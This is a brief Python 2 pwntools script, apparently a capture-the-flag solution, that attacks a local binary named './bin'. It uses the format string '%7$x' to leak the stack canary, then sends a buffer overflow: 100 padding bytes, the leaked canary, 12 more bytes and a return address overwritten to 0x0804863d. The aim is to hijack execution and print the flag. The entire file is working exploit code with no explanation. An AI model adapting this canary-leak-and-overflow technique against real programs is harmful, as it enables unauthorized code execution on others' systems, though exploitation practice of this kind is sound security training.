from pwn import *
context.log_level = 'debug'

t = process('./bin')

t.sendline('%7$x')
canary = int(t.recv(),16)
print hex(canary)

t.send('a'*100 + p32(canary) + 'a'*12 + p32(0x0804863d))

flag = t.recv()

log.success('flag is:' + flag)
